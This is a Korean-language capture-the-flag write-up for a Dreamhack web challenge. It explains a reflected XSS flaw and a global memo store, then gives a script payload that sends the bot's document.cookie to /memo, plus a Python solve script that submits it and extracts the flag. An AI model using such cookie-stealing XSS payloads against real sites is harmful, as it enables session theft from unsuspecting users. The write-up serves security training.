# Category

web

# Overview

여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다.
XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.

플래그 형식은 DH{...} 입니다.

# Analysis

- GET `/vuln` 요청 시 입력한 `param`값에 대한 검증이 없어 스크립트가 입력한 대로 실행되는 취약점이 존재한다.

- GET `/memo` 요청 시 입력한 `memo`값이 전역변수 `memo_text`에 누적되어 `memo.html`이 렌더링 될 때마다 `memo_text`값을 노출한다.

1. POST `/flag`로 `param`를 입력하여 요청하면 `check_xss`함수로 flag가 담긴 `cookie`와 `param`이 전달된다.

2. `check_xss` 함수에서 `/vuln`에 `param`을 전달하는 `url`이 생성되며, `read_url` 함수로 생성한 `url`과 `cookie`가 전달된다.

3. `read_url` 함수에서 내부적으로 셀리니움을 통해 브라우저를 만들고 `cookie`를 추가하고 전달받은 `url`을 실행하게 된다.

# Exploitation

- 브라우저를 통한 접근
  1. flag가 입력된 `cookie`의 값을 확인하기 위해, `param`을 아래와 같이 입력하여 POST `/flag`를 요청한다.

     ```js
     <script>location.href =`/memo?memo=${document.cookie}`</script>
     ```

     위의 스크립트를 통해 `read_url` 함수에서 실행되는 브라우저에 저장된 `cookie`값을 `/memo`로 이동시켜 전역변수 `memo_text`에 저장시켜놓을 수 있다.

  2. GET `/memo`요청 시 저장된 flag 값을 확인 할 수 있다.

- 코드를 통한 접근

  ```py
  # solve.py
  import re
  from requests import request as req

  # 쿠키의 값을 읽어와 /memo에 요청하는 스크립트
  script = "<script>location.href =`/memo?memo=${document.cookie || 'NONE'}`</script>"

  # /flag 요청
  res_flag = req(
      method="POST",
      url="http://host8.dreamhack.games:11466/flag",
      data={"param": script},
  )

  if not res_flag.status_code == 200:
      raise Exception("ERROR")

  # /memo 확인
  res_memo = req(
      method="GET",
      url="http://host8.dreamhack.games:11466/memo",
  )

  # flag 필터링
  match = re.search("DH{.*}", res_memo.text)

  print(match.group() if match else "NO FLAG")
  ```

# Flag

`DH{2c...8e}`
